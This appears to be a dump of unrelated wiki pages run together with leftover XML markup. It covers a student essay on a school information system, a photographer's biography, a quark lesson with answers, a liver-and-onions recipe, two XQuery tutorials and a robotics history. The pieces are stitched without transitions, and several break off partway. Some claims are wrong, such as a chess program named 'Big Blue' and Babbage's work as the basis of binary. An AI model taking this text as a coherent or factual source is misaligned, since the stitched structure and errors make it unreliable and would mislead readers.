The school officials knew that because they using a server, a computer that controls access to hardware, software and other resources on a network and provides a centralized storage area for programs, data and information (Discovering Computers, 2007), that was connected to a mainframe, a large, expensive, powerful computer that can handle hundreds or thousands of connected users simultaneously (Discovering Computers, 2007), they were able to power a system with a large information system, if needed, so we knew that if the information system was large, the school had the adequate equipment to operate the system. We also know that it was capable of holding data to back up tracking and stored information. Other factors that that school officials were concerned with was making this information system their official website page so that links could be accessed through that page and they wanted to be able to provide technical support for teachers.

'''Analysis''' 


Analysis is the process of breaking a complex topic or substance into smaller parts to gain a better understanding of it (wikipedia.org/wiki/Analysis). That is what was done to design Charlene SIS to better fit the needs of everyone who would be using it. Every child has a different learning style. Wouldn't it be great to be able to use an information system that provides a personalized learning program for your child to help them learn at their own pace? Well Charlene SIS can do that. With this information system, children have access to the system, at school or at home if they have access to the computer, and can log-in on to the system, on their own time to work on school lesson plans, to complete electronic worksheets, to review work assignments they worked on today, to get their homework assignments, to send emails to other students or teachers, etc. The design includes a student section that is kid friendly, has age appropriate material, is censored to obtain only information and links to websites that are approved by the teachers and they can interact with other students using the interactive educational game portal, which allows the students to participant in Math, Language Arts, Reading, Science and Social Studies games as a group. 

Teachers can set up links to websites, or web pages with a collection of information accessible through the Internet, that can provide practice material that the students can work on, at their own pace. Teachers can also upload electronic worksheets and other material that the students can use as extra credit to catch up on low classroom or test scores.Teachers can create newsletters, lesson plans, and rubrics using uploaded templates and can put them on the parent section for the parents to review. Parents can participate in video conferences with teachers on the parent section and they can participate in webinars that help them find out more information about testing, homework assignments and so much more. 

The designers of Charlene SIS, analyzed the planning goals and tried to accommodate everyone who was using the system by breaking down the planning objectives into smaller parts and designing it so that every one's needs were met. 


'''Design''' 


The Design of the information system involved finding a model or structure for the system. We knew what who it was for, what they wanted it to do and we had to design it to look like like the plan we formatted. The information system had to have a profession scheme but it also had to be kid friendly, so we gave it a professional background that would appeal to the adults, but added fun clip art, with moving objects to appeal to the students. The main page, which was the school district's main page, had the district logo on it and pertinent information what the school district offered, their schools and the information system was accessible by clicking on a side bar menu for teachers, parents and students. Once you clicked on your option, it would take you to your section of the information system, for example, students would go to the student page and once the student logged in, they could access all of the sections that were for the students, and vice versa for teachers and parents. 

Teachers are the only ones that could access the students and the parents page and were able to make changes to anything they submitted on either page. Their section has templates for lesson plans, newsletters, etc.; Their section allows them to chat with each other for ideas, allows them to schedule video conferences with parents, allows them to email students and parents, etc. 

Parents were able to view their pages and could click on their child's teachers' page to find out any information that the child's teacher has posted on her page. On the parents page, was also a place where they could schedule a video conference with their child's teacher and a section where they could sign up for a webinar to get more information about subjects of concern to their, such as grades, standards, testing, etc. 

School officials had access to all of the sections and could print data or tracking information, etc. School curriculum coordinators update the curriculum sections and provide support and information for teachers as technical support is available to provide teachers who were trained on how to use the system with ongoing support. In addition, two system analysis were hired to help with problems may occur during the operation of the system. 

A considerable amount of research, thought, modeling and interactive adjustment went into the design of Charlene SIS. The system was tested by a test subject of students, parents, teachers and school officials, and the information system was re-designed several times, before it could be used. After a two year time frame and a budget of $ over 140,000.00, Charlene SIS was finalized and put into production.


'''Implementation'''


Charlene SIS was implemented and put into production on June 1, 2008. Although the designed was approved, we did a pilot run of the program in middle schools in the school district first and after a year, the program had manifested to all schools, elementary, high school, charter and adult education sites within the district. By June 1, 2009, the system was up and running and being implemented all over the district. 

The plan was put into effect, and the analysis helped to design an educational, fun, innovative tool that everyone could use. Like every system, Charlene SIS has flaws, but overall, it's been highly effective in educating students, parents and teachers.

      <text xml:space="preserve">David E. Johnson was born in Charleston, South Carolina in 1948. He graduated from Princess Anne High School in 1966 and started attending Old Dominion University that fall. While there, he was a member of the SDS and was kicked out of the university due to his involvement with the group. He then ventured to New York to attend the Rochester Institute of Technology for photography, graduating in 1971. He also studied at the University of New Mexico, and received his MFA in 1977 from University of Colorado at Boulder.  He returned home to Virginia that year and started teaching at ODU as an adjunct in photo. Wally Dreyer was the only person teaching the subject at the time, and it wasn't offered as a credited course because Dreyer did not have the proper qualifications to do so. David Johnson became the first full time photography teacher at ODU in 1978. He co-directed the university gallery for 12 yrs and was Graduate Program Director for three years. He spent 30 years teaching at ODU until he retired in 2007. Subsequently, his privileges as professor emeritus have been suspended.  He cannot even receive email from university accounts. This blacklisting is an ironic twist of history repeating itself with his original expulsion from ODU.

The photography department at ODU went completely digital in 2000 and abandoned silver print.

      <text xml:space="preserve">Quarks (pronounced like 'orcs' with a 'qu' on the front) are a subset of the fermions - they make up part of matter, most notably the nuclei of atoms. Quarks interact with all four of the fundamental forces: gravity, electromagnetism, and the weak and strong nuclear forces.

==Generations==
There are four quarks in each of the three generations of fermions. The first contains the up quark (&lt;math&gt;u&lt;/math&gt;), down quark (&lt;math&gt;d&lt;/math&gt;), antiup quark (&lt;math&gt;\bar{u}&lt;/math&gt;) and antidown quark (&lt;math&gt;\bar{d}&lt;/math&gt;). The second generation contains the charm quark (&lt;math&gt;c&lt;/math&gt;), strange quark (&lt;math&gt;s&lt;/math&gt;), anticharm quark (&lt;math&gt;\bar{c}&lt;/math&gt;) and antistrange quark (&lt;math&gt;\bar{s}&lt;/math&gt;). The third generation contains the top quark (&lt;math&gt;t&lt;/math&gt;), bottom quark (&lt;math&gt;b&lt;/math&gt;), antitop quark (&lt;math&gt;\bar{t}&lt;/math&gt;) and antibottom quark (&lt;math&gt;\bar{b}&lt;/math&gt;).

==Charge==
The up, charm and top quarks have a charge of +⅔e, and so their respective antiparticles have a charge of -⅔e. The down, strange and bottom quarks have a charge of -⅓e, and so their respective antiparticles have a charge of +⅓e.

==Hadrons==
When quarks are combined, they form larger particles, which are not fundamental. These larger particles are known as hadrons and are held together by the strong nuclear force. There are two types of hadrons: baryons and mesons.

===Baryons===
Baryons are hadrons which are made up of three quarks. The two most common baryons are the proton and the neutron. Protons are made up of two up quarks and one down quark, giving them a total charge of +1e. Neutrons are made up of one up quark and two down quarks, giving them net charge of 0.

===Mesons===
Mesons are hadrons which are made up of a quark and an antiquark. For example, pions are made up of two first generation quarks - the &amp;pi;&lt;sup&gt;0&lt;/sup&gt; is made up of either an up quark and an antiup quark, or a down quark and an antidown quark. The &amp;pi;&lt;sup&gt;+&lt;/sup&gt; is made up of an up quark and an antidown quark (total charge +1e), and The &amp;pi;&lt;sup&gt;-&lt;/sup&gt; is made up of a down quark and an antiup quark (total charge -1e).

==Questions==

1. The &amp;Delta;&lt;sup&gt;++&lt;/sup&gt; baryon is made up of up quarks. What is its total charge?

2. The &amp;Delta;&lt;sup&gt;-&lt;/sup&gt; baryon has a total charge of -1e. Given that it is made up of only one type of first generation quark, what is this quark?

3. What is an antiproton made of? What is its charge?

4. A K+ meson is made of an up quark and an antistrange quark. What is its total charge?

5. Lambda (&amp;Lambda;) baryons are made up of an up quark, a down quark, and another quark (not an antiquark). The &amp;Lambda;&lt;sup&gt;0&lt;/sup&gt; is neutral, and contains a second generation quark. What is this quark?

      <text xml:space="preserve">'''1. The &amp;Delta;&lt;sup&gt;++&lt;/sup&gt; baryon is made up of up quarks. What is its total charge?'''

Baryons are made of three quarks. 3 x +⅔ = +2e

'''2. The &amp;Delta;&lt;sup&gt;-&lt;/sup&gt; baryon has a total charge of -1e. Given that it is made up of only one type of first generation quark, what is this quark?'''

Three identical quarks must have a total charge of -1e, so one of these quarks has a charge of -⅓e. This is a down quark.

'''3. What is an antiproton made of? What is its charge?'''

&lt;math&gt;\bar{u}\bar{u}\bar{d}&lt;/math&gt;, total charge -1e.

'''4. A K+ meson is made of an up quark and an antistrange quark. What is its total charge?'''

⅔ + ⅓ = +1e

'''5. Lambda (&amp;Lambda;) baryons are made up of an up quark, a down quark, and another quark (not an antiquark). The &amp;Lambda;&lt;sup&gt;0&lt;/sup&gt; is neutral, and contains a second generation quark. What is this quark?'''

0 = +⅔ - ⅓ + q

q = -⅓

The second generation quark with a charge of -⅓e is the strange quark.

To serve around 4 people

==Ingredients==

* Lamb's liver or Ox liver, sliced - about 500g
* 2 large onions
* Oil or butter for frying
* Flour
* Salt and pepper
* Henderson's relish, Worcestershire sauce or similar (optional)
* Fresh or frozen green vegetables, such as peas, kale, cabbage, broccoli etc
* Water - about a pint - boiling

===For the mash===
* 1kg potatoes
* Large knob of butter
* A splash of milk, cream, creme fraiche or similar

==Procedure==

#Wash (and optionally peel) the potatoes and put in a pan of boiling water.
# Chop the onions into thin slices and fry gently in a large frying pan with some of the oil or butter.
# While the onions are frying prepare your green vegetables and further slice the liver if necessary.
# Prepare a plate or wide bowl, covering it in flour mixed with a bit of salt and pepper. This is for dusting the liver prior to frying - easiest done if you arrange the liver, flour and frying pan in a straight line across your work-surface.
# Once the potatoes are cooked - drain and then mash them, adding butter and cream or milk until you have the desired consistency. Put a lid on the pan to keep warm.
# Once the onions are soft, remove them from the pan with a slotted spoon, squeezing the oil or butter back into the frying pan as you remove them. Put them in a bowl on one side.
# Turn the heat of your frying pan up as high as possible and add a bit more oil or butter if necessary.
# Start the process of dusting the slices of liver with flour on both sides and adding them to the hot pan. This needs to be done as quickly as possible and can be quite messy. Do not over-crowd the pan - if you find the liver takes up more surface-space than is available then leave the remains on one side and fry in a second batch. 
# The liver should be cooked fast, for only about a minute on each side so the slices are still pink within. Turn them over a couple of times. Quite a bit of the flour and blood will stick to the bottom of the pan. This is ok - don't scrape it off as it will be used for the gravy in a moment.
#Once the liver is done to your satisfaction remove it from the pan and put directly onto warmed plates. Have someone else serve out the mash and vegetables while you finish the gravy..... The trick is to try and not let everything else get cold while you are doing this.
#Leaving the pan on a high heat, put the onions back in, add a good splash of Hendersons, and stir vigorously while adding boiling water (even better, you can re-use the hot water from the vegetables - this can be a smooth manoeuvre, draining it into the gravy as you pass the pan over to be served onto plates), dissolving the juices stuck to the bottom of the pan. The gravy should thicken from the flour already stuck to the bottom of the pan. If it doesn't get thick enough you can add a bit more flour or cornflour (mixed with a little cold water in a small cup to avoid lumps). Once the gravy is hot and thickened, spoon generously over the plates.</text>

    <title>XQuery/Compare with XQuery</title>

      </contributor>
      <text xml:space="preserve">== Motivation ==
You want to use XQuery to compare two lists of items and find out how the lists are different
== Methods ==
We will use a variety of functions that iterate through the lists.  For each example we will perform some comparison with the second list.

== Simple iteration and test for missing elements ==
In this first example, we will use a simple for loop to go through each item on a linear list.  We then will check to see if that item is anywhere on the second list (regardless of order).  If it is on the second list we will display the item from the first list.  If not we will output &quot;missing&quot;.  This is useful if you want to find out if a local collection is missing files from some remote collection.
&lt;source lang=&quot;xml&quot;&gt;
xquery version &quot;1.0&quot;;

(: Compare of two linear lists :)

let $list1 :=
&lt;list1&gt;
   &lt;item&gt;a&lt;/item&gt;
   &lt;item&gt;b&lt;/item&gt;
   &lt;item&gt;c&lt;/item&gt;
   &lt;item&gt;d&lt;/item&gt;
&lt;/list1&gt;


let $list2 :=
&lt;list1&gt;
   &lt;item&gt;a&lt;/item&gt;
   &lt;item&gt;c&lt;/item&gt;
   &lt;item&gt;e&lt;/item&gt;
&lt;/list1&gt;

return
&lt;missing&gt;{
  for $item1 in $list1/item
  let $item-text := $item1/text()
  return
    &lt;test item=&quot;{$item-text}&quot;&gt;
    {if ($list2/item/text()=$item-text)
       then ($item1)
       else &lt;missing&gt;{$item-text}&lt;/missing&gt;
    }
     &lt;/test&gt;
}&lt;/missing&gt;
&lt;/source&gt;
Note that the conditional expression:

  if ($list2/item/text() = $item-text)

Tests to see if the $item-text is anywhere in list2.  If it occurs anywhere this expression will return true().

== Sample Results ==
&lt;source lang=&quot;xml&quot;&gt;
&lt;missing&gt;
    &lt;test item=&quot;a&quot;&gt;
        &lt;item&gt;a&lt;/item&gt;
    &lt;/test&gt;
    &lt;test item=&quot;b&quot;&gt;
        &lt;missing&gt;b&lt;/missing&gt;
    &lt;/test&gt;
    &lt;test item=&quot;c&quot;&gt;
        &lt;item&gt;c&lt;/item&gt;
    &lt;/test&gt;
    &lt;test item=&quot;d&quot;&gt;
        &lt;missing&gt;d&lt;/missing&gt;
    &lt;/test&gt;
&lt;/missing&gt;
&lt;/source&gt;

Note that this will not report any items on the second list that are missing from the first list.

== Using Quantified Expressions ==

This can be rewritten using XQuery quantified expressions.  There are two reasons for this.  First the XQuery optimizer can frequently run quantified expressions much faster and some people feel they are easier to read.  See [[XQuery/Quantified Expressions]] for more details.

In this second example the list assignments are the same but we will only display the items from list 1 that are missing from list 2.

&lt;source lang=&quot;xml&quot;&gt;
&lt;missing&gt;{
  for $item1 in $list1/item
  return
    if (some $item2 in $list2/item satisfies $item2/text() = $item1/text())
       then ()
       else $item1
}&lt;/missing&gt;
&lt;/source&gt;
This returns:

&lt;source lang=&quot;xml&quot;&gt;
&lt;missing&gt;
   &lt;item&gt;b&lt;/item&gt;
   &lt;item&gt;d&lt;/item&gt;
&lt;/missing&gt;
&lt;/source&gt;

We are now ready to modularize this missing function so that we can pass any two lists to find missing elements.

== Creating a Missing XQuery Function ==
Our next step is to create an XQuery function that compare any two lists and returns the items in the second list that are not in the first list.

&lt;source lang=&quot;xml&quot;&gt;
declare function local:missing($list1 as node()*, $list2 as node()*) as node()* {
  for $item1 in $list1/item
  let $item-text := $item1/text()
  return
    if (some $item2 in $list2/item satisfies $item2/text() = $item1/text())
       then ()
       else $item1
};
&lt;/source&gt;

We can rewrite the output function to use this function:

&lt;source lang=&quot;xml&quot;&gt;
&lt;results&gt;
   &lt;missing-from-2&gt;{local:missing($list1, $list2)}&lt;/missing-from-2&gt;
   &lt;missing-from-1&gt;{local:missing($list2, $list1)}&lt;/missing-from-1&gt;
&lt;/results&gt;
&lt;/source&gt;
Note that the order of the lists has been reversed in the second call to the missing() function.  The second pass looks for items on list2 that are not on list1.

Running this query generates the following output:

&lt;source lang=&quot;xml&quot;&gt;
&lt;results&gt;
    &lt;missing-from-2&gt;
        &lt;item&gt;b&lt;/item&gt;
        &lt;item&gt;d&lt;/item&gt;
    &lt;/missing-from-2&gt;
    &lt;missing-from-1&gt;
        &lt;item&gt;e&lt;/item&gt;
    &lt;/missing-from-1&gt;
&lt;/results&gt;
&lt;/source&gt;

== Creating HTML Difference Lists ==

We can use CSS to style the output of these reports.

== Screen Image ==
[[Image:html-diff-report-using-xquery.jpg|center|frame|HTML Diff Report using CSS]]

== Sample Data ==
This example uses full words of items to show text highlighting:
&lt;source lang=&quot;xml&quot;&gt;
let $list1 :=
&lt;list&gt;
   &lt;item&gt;apples&lt;/item&gt;
   &lt;item&gt;bananas&lt;/item&gt;
   &lt;item&gt;carrots&lt;/item&gt;
   &lt;item&gt;kiwi&lt;/item&gt;
&lt;/list&gt;


let $list2 :=
&lt;list&gt;
   &lt;item&gt;apples&lt;/item&gt;
   &lt;item&gt;carrots&lt;/item&gt;
   &lt;item&gt;grapes&lt;/item&gt;
&lt;/list&gt;
&lt;/source&gt;

The following function uses HTML div and span elements and adds class=&quot;missing&quot; to each div that is missing.  The CSS file will highlight this background.

&lt;source lang=&quot;xml&quot;&gt;
declare function local:missing($list1 as node()*, $list2 as node()*) as node()* {
  for $item1 in $list1/item
  return
    if (some $item2 in $list2/item satisfies $item2/text() = $item1/text())
       then &lt;div&gt;{$item1/text()}&lt;/div&gt;
       else
       &lt;div&gt;
        {attribute {'class'} {'missing'}}
        {$item1/text()}         
       &lt;/div&gt;
};
&lt;/source&gt;

We then use the following CSS file to highlight the differences.  Each missing element must have '''class=&quot;missing&quot;''' attribute for the missing element to be highlighted in this report.
&lt;source lang=&quot;css&quot;&gt;
body {font-family: Ariel,Helvetica,sans-serif; font-size: large;}
h2 {padding: 3px; margin: 0px; text-align: center; font-size: large; background-color: silver;}
.left, .right {border: solid black 1px; padding: 5px;}
.missing {background-color: pink;}
.left {float: left; width: 190px}
.right {margin-left: 210px; width: 190px}
&lt;/source&gt;

&lt;source lang=&quot;xml&quot;&gt;
&lt;body&gt;
      &lt;h1&gt;Missing Items Report&lt;/h1&gt;
      &lt;div class=&quot;left&quot;&gt;
         &lt;h2&gt;List 1&lt;/h2&gt;
         {for $item in $list1/item return &lt;div&gt;{$item/text()}&lt;/div&gt;}
      &lt;/div&gt;
      &lt;div class=&quot;right&quot;&gt;
         &lt;h2&gt;List 2&lt;/h2&gt;
         {for $item in $list2/item return &lt;div&gt;{$item/text()}&lt;/div&gt;}
      &lt;/div&gt;
      &lt;br/&gt;
      &lt;div class=&quot;left&quot;&gt;
         &lt;h2&gt;List 1 Missing from 2&lt;/h2&gt;
         {local:missing($list1, $list2)}
      &lt;/div&gt;
      &lt;div class=&quot;right&quot;&gt;
         &lt;h2&gt;List 2 Missing from 1&lt;/h2&gt;
         {local:missing($list2, $list1)}
      &lt;/div&gt;
   &lt;/body&gt;
&lt;/source&gt;

== Collation ==

If the lists are in sorted order, or can be sorted into order, an alternative approach is to recursively collate the two lists.  The core algorithm looks like:

&lt;source lang=&quot;xml&quot;&gt;
declare function local:merge($a, $b  as item()* )  as item()* {
    if (empty($a) and empty($b))
    then ()
    else if (empty ($b) or $a[1] lt $b[1])
    then ($a[1], local:merge(subsequence($a, 2), $b))
    else  if (empty($a) or $a[1] gt $b[1])
    then  ($b[1],local:merge($a, subsequence($b,2)))           
    else (: a and b matched :)
          ($a[1], $b[1],  local:merge(subsequence($a,2), subsequence($b,2)))
   };
&lt;/source&gt;

With the example above, we can merge two lists. 
&lt;source lang=&quot;xml&quot;&gt;
  
let $list1 := 
&lt;list&gt;
   &lt;item&gt;apples&lt;/item&gt;
   &lt;item&gt;bananas&lt;/item&gt;
   &lt;item&gt;carrots&lt;/item&gt;
   &lt;item&gt;kiwi&lt;/item&gt;
&lt;/list&gt;
 
 
let $list2 := 
&lt;list&gt;
   &lt;item&gt;apples&lt;/item&gt;
   &lt;item&gt;carrots&lt;/item&gt;
   &lt;item&gt;grapes&lt;/item&gt;
&lt;/list&gt;

return 
&lt;result&gt;
{local:merge($list1/item,$list2/item) }
&lt;/result&gt;

&lt;/source&gt;

The actions on merge will depend on the application and the algorithm can be modified to output only mismatched items on one or other list, and handle matching items appropriately.  For example, to display the merged list as HTML, we might modify the algorithm to: 

&lt;source lang=&quot;xml&quot;&gt;
declare function local:merge($a, $b  as item()*  )  as item()* {
    if (empty($a) and empty ($b)) 
    then ()
    else if (empty ($b) or $a[1] lt $b[1])
    then (&lt;div class=&quot;left&quot;&gt;{$a[1]/text()}&lt;/div&gt;, local:merge(subsequence($a, 2), $b))
    else if (empty ($a) or $a[1] gt $b[1])
    then  (&lt;div class=&quot;right&quot;&gt;{$b[1]/text()}&lt;/div&gt;,local:merge($a, subsequence($b,2)))  
    else  (&lt;div class=&quot;match&quot;&gt;{$a[1]/text()}&lt;/div&gt;,  local:merge(subsequence($a,2), subsequence($b,2)))
  };
&lt;/source&gt;

      <text xml:space="preserve">== Everything We Know About Robotics ==
 ro·bot·ics   (rō-bŏt'ĭks) - is The science or study of the technology associated with the design, fabrication, theory, 
 and application of robots.

If you think robots are mainly the stuff of space movies, think again. Right now, all over the world, robots are on the move. They’re painting cars at Ford plants, assembling Milano cookies for Pepperidge Farms, walking into live volcanoes, driving trains in Paris, and defusing bombs in Northern Ireland. As they grow tougher, nimbler, and smarter, today’s robots are doing more and more things we can’t –or don’t want to–do.

Robots have been with us for less than 50 years, but the idea of inanimate creations to do our bidding is much, much older. The ancient Greek poet Homer described maidens of gold, metallic helpers for the Hephaistos, the Greek god of the forge. The golems of medieval Jewish legend were robot-like servants made of clay, brought to life by a spoken charm. Leonardo da Vinci drew plans for a mechanical man in 1495. 

But real robots wouldn’t become possible until the 1950’s and 60’s, with the invention of transistors and integrated circuits. Compact, reliable electronics and a growing computer industry added brains to the brawn of already existing machines. In 1959, researchers demonstrated the possibility of robotic manufacturing when they unveiled a computer-controlled milling machine. Its first product: ashtrays.

-What is a robot?-

There’s no precise definition, but by general agreement a robot is a programmable machine that imitates the actions or appearance of an intelligent creature–usually a human. To qualify as a robot, a machine has to be able to do two things: 1) get information from its surroundings, and 2) do something physical–such as move or manipulate objects.

The word robot comes from the Czech word robota, meaning drudgery or slave-like labor. It was first used to describe fabricated workers in a fictional 1920s play by Czech author Karel Capek called Rossum’s Universal Robots. In the story, a scientist invents robots to help people by performing simple, repetitive tasks. However, once the robots are used to fight wars, they turn on their human owners and take over the world.

Public fascination with robotics peaked in the early 1980’s, spurred in part by movies like Star Wars, which featured robots C3-PO and R2-D2 as helpful sidekicks to the their human masters. But interest sagged in a few short years as people discovered that getting robots to do things that we think of as easy–like moving across a cluttered room–is surprisingly difficult. 

Today, robots are enjoying a resurgence. As computer processors are getting faster and cheaper, robots can afford to get smarter. Meanwhile, researchers are working on ways to help robots move and &quot;think&quot; more efficiently. Although most robots in use today are designed for specific tasks, the goal is to someday make universal robots, robots that are flexible enough to do just about anything a human does–and more.


'''&lt;u&gt;10 Amazing Facts about Robots.&lt;/u&gt;'''

1. Elektro, the world’s first humanoid robot, debuted in 1939. Built by Westinghouse, the seven-foot-tall walking machine “spoke” more than 700 words. Elektro later appeared in the 1960 B movie Sex Kittens Go to College. 

2. The first known case of robot homicide occurred in 1981, when a robotic arm crushed a Japanese Kawasaki factory worker. 

3.  Leonardo da Vinci drew up plans for an armored humanoid machine in 1495. Engineer Mark Rosheim has created a functional miniature version for NASA to help colonize Mars

4. Archytas of Tarentum, a pal of Plato’s, built a mechanical bird driven by a jet of steam or compressed air—arguably history’s first robot—in the fifth century B.C.

5. There are currently 4,000 robots serving in the US Military, including reconnaissance Talon bots that scout for roadside bombs in Iraq and PackBots that unsuccessfully poked around for Osama bin Laden’s hideout in Afghanistan. 

6. Chris Melhuish of the Bristol Robotics Laboratory created robots that use bacteria-filled fuel cells to produce electricity from rotten apples and dead flies. The goal: robots that forage for their own food- essentially they wouldn’t need humans to survive.

7.  Mini Me: Australian researchers are trying to build a micro robot that would mimic the swim stroke used by E. coli bacteria. It would be injected into a patient so it could take a biopsy from the inside.

8. Cybernetics professor Kevin Warwick calls himself the world’s first cyborg, with computer chips implanted in his left arm. He can remotely operate doors, an artificial hand, and an electronic wheelchair.

9.  Winebot, built by Japan’s NEC System Technologies and Mie University, can ID scads of different wines, cheeses, and hors d’oeuvres . . . up to a point. It recently mistook a reporter’s hand for prosciutto. (In Winebot’s defense, that guy was a pig.)

10. Robotics expert Henrik Christensen predicts humans will be having sex with robots within four years. If you’re thinking, “Finally, no strings attached…” keep in mind that Hans Moravec, founder of Carnegie Mellon’s Robotics Institute, predicts that robots will emerge as their own species by 2040, with feelings and expectations. In other words, if you don’t call your robot fling the next morning, you’ll be disassembled.

'''&lt;u&gt;A Brief History about Robotics.&lt;/u&gt;'''

~ 350 B.C
The brilliant Greek mathematician, Archytas ('ahr 'ky tuhs') of Tarentum builds a mechanical bird dubbed &quot;the Pigeon&quot; that is propelled by steam. It serves as one of histories earliest studies of flight, not to mention probably the first model airplane.

~ 322 B.C.
The Greek philosopher Aristotle writes...


“If every tool, when ordered, or even of its own accord, could do the work that befits it... then there would be no need either of apprentices for the master workers or of slaves for the lords.”
...hinting how nice it would be to have a few robots around.

~ 200 B.C.
The Greek inventor and physicist Ctesibus ('ti sib ee uhs') of Alexandria designs water clocks that have movable figures on them. Water clocks are a big breakthrough for timepieces. Up until then the Greeks used hour glasses that had to be turned over after all the sand ran through. Ctesibus' invention changed this because it measured time as a result of the force of water falling through it at a constant rate. In general, the Greeks were fascinated with automata of all kinds often using them in theater productions and religious ceremonies.

1495
Leonardo DaVinci designs a mechanical device that looks like an armored knight. The mechanisms inside &quot;Leonardo's robot&quot; are designed to make the knight move as if there was a real person inside. Inventors in medieval times often built machines like &quot;Leonardo's robot&quot; to amuse royalty.

1738
Jacques de Vaucanson begins building automata in Grenoble, France. He builds three in all. His first was the flute player that could play twelve songs. This was closely followed by his second automaton that played a flute and a drum or tambourine, but by far his third was the most famous of them all. The duck was an example of Vaucanson's attempt at what he called &quot;moving anatomy&quot;, or modeling human or animal anatomy with mechanics.&quot; The duck moved, quacked, flapped it's wings and even ate and digested food.

1770
Swiss clock makers and inventors of the modern wristwatch Pierre Jaquet-Droz and later joined by his son Henri-Louis Jaquet-Droz start making automata for European royalty. They create three dolls, each with a unique function. One can write, another plays music, and the third draws pictures.

1801
Joseph Jacquard builds an automated loom that is controlled with punched cards. Punch cards are later used as an input method for some of the 20th centuries earliest computers.

1822
Charles Babbage demonstrates a prototype of his &quot;Difference Engine&quot; to the Royal Astronomical Society. He continues his work by designing an even more ambitious project &quot;the Analytical Engine&quot; that reportedly was to use punch cards inspired by Joseph Jacquard's invention. During his lifetime he never produces a functional version of either machine. Despite this shortcoming he is often heralded as the &quot;Father of the Computer&quot; and his work lives on as the foundation for the binary numbering system that is the basis of modern computers.

1847
George Boole represents logic in mathematical form with his Boolean Algebra.

1898
Nikola Tesla builds and demonstrates a remote controlled robot boat at Madison Square Garden.

1921
Czech writer Karel Capek introduced the word &quot;Robot&quot; in his play &quot;R.U.R&quot; (Rossuum's Universal Robots). &quot;Robot&quot; in Czech comes from the word &quot;robota&quot;, meaning &quot;compulsory labor&quot;

1926
Fritz Lang's movie &quot;Metropolis&quot; is released. &quot;Maria&quot; the female robot in the film is the first robot to be projected on the silver screen.

1936
Alan Turing introduces the concept of a theoretical computer called the Turing Machine. Despite being a fundamental advance in computer logic it also spawns new schools in Mathematics.

1940
Issac Asimov produces a series of short stories about robots starting with &quot;A Strange Playfellow&quot; (later renamed &quot;Robbie&quot;) for Super Science Stories magazine. The story is about a robot and its affection for a child that it is bound to protect. Over the next 10 years he produces more stories about robots that are eventually recompiled into the volume &quot;I, Robot&quot; in 1950.

Asimov is generally credited with the popularization of the term &quot;Robotics&quot; which was first mentioned in his story &quot;Runaround&quot; in 1942. But probably Issac Asimov's most important contribution to the history of the robot is the creation of his Three Laws of Robotics:

A robot may not injure a human being, or, through inaction, allow a human being to come to harm.

A robot must obey the orders given it by human beings except where such orders would conflict with the First Law.

A robot must protect its own existence as long as such protection does not conflict with the First or Second Law.

Asimov later adds a &quot;zeroth law&quot; to the list:

Zeroth law: A robot may not injure humanity, or, through inaction, allow humanity to come to harm.
1946
George Devol patents a playback device for controlling machines.

1950
Alan Turing publishes Computing Machinery and Intelligence in which he proposes a test to determine whether or not a machine has gained the power to think for itself. It becomes known as the &quot;Turing Test&quot;.

1966
An artificial intelligence program named ELIZA is created at MIT by Joseph Weizenbaum. ELIZA functions as a computer psychologist that manipulates its users statements to form questions. Weizenbaum is disturbed at how quickly people put faith in his little program.

1967
Richard Greenblatt writes, MacHack, a program that plays chess, in response to a recent article written by Hurbert Dreyfus where he suggests, as a critique to efforts in artificial intelligence, that a computer program could never beat him in a game of chess. When the program is finished and Dreyfus is invited to play the computer he leads for most of the game but ultimately loses in the end in a close match. Greenblatt's program would be the foundation for many future chess programs, ultimately culminating in Big Blue the chess program that beats chess Grand Master Gary Kasparov.

      <comment>/* Fixed typo:  data -&gt; date in last paragraph. */</comment>
      <text xml:space="preserve">== Motivation ==
You want to update items on collections that are new or newer than another collection.

== Method ==
Many database store creation dates and last-modified dates along with resources.  These dates can be used to see if a local collection is out of sync with a remote collection.  An XQuery script can be written that will only list the new files or files that are newer then the creation date on your local collection.

For the eXist database, here are the two functions that are used to access the timestamps.

   xmldb:last-modified($collection, $resource)
   xmldb:created($collection, $resource)
   
Where:
   '''$collection''' is the path to the collection (xs:string)
   '''$resource''' is the name of the resource (xs:string)

For example:

    let $my-file-last-modified := xmldb:last-modified('/db/test', 'myfile.xml')

Will return the date and time that the file myfile.xml in the collection /db/text was last modified.  The format of the timestamp is the [http://www.w3.org/TR/2001/REC-xmlschema-2-20010502/#dateTime XML Schema dateTime format]:

   &quot;2009-06-04T07:50:04.828-05:00&quot;

For example, this indicates the time is 7:50 am on June the 4th, 2009 for Central Standard Time which is 5 hours behind Coordinated Universal Time (UTC).

== Sample Recursive Collection Last Modified Function ==

You can combine the '''xmldb:last-modified()''' function with another function '''xmldb:get-child-collections($collection)'''  that returns all of the child collections of the current collection.  By calling itself using tail recursion you can find all the last modified dates within a collection and all its subcollections.

Here is a sample XQuery function that returns a list of all the last-modified date-times of the resources in a collection and all of the subcollections under it.

&lt;source lang=&quot;xml&quot;&gt;
declare function local:collection-last-modified($collection as xs:string) as node()* {
&lt;collection&gt;
   {attribute {'cid'} {$collection} }
   {for $resource in xmldb:get-child-resources($collection)
      return
      &lt;resource&gt;
        {attribute {'id'} {$resource}}
        {attribute {'last-modified'} {xmldb:last-modified($collection, $resource)}}
      &lt;/resource&gt;,
      if (exists(xmldb:get-child-collections($collection)))
        then (
           for $child in xmldb:get-child-collections($collection)
           order by $child
           return
              (: note the recursion here :)
              local:collection-last-modified(concat($collection, '/', $child))
           )
         else ()
  }
&lt;/collection&gt;
};
&lt;/source&gt;
Note that two attributes are added to each resource.  One is the resource id which must be unique in each collection an the other is the date the resource was last modified.

== Sample Driver ==

You can call this function by simply passing the collection root you wish to start at.

&lt;source lang=&quot;xml&quot;&gt;
xquery version &quot;1.0&quot;;
let $collection := '/db/test'

return
&lt;last-modified-report&gt;
  {local:collection-last-modified($collection)}
&lt;/last-modified-report&gt;
&lt;/source&gt;

This returns the following file:

&lt;source lang=&quot;xml&quot;&gt;
&lt;last-modified-report&gt;
   &lt;collection cid=&quot;/db/test&quot;&gt;
      &lt;resource id=&quot;get-remote-collection.xq&quot; last-modified=&quot;2009-04-29T08:16:06.104-05:00&quot;/&gt;
      &lt;collection cid=&quot;/db/test/views&quot;&gt;
         &lt;resource id=&quot;get-site-mod-dates.xq&quot; last-modified=&quot;2009-04-30T09:01:58.599-05:00&quot;/&gt;
         &lt;resource id=&quot;site-last-modified.xq&quot; last-modified=&quot;2009-04-30T09:07:10.016-05:00&quot;/&gt;
      &lt;/collection&gt;

== Driving Syncs with Apache Ant ==
You can now use these transforms to create batch files that will transfer only the files that have changed or are new.

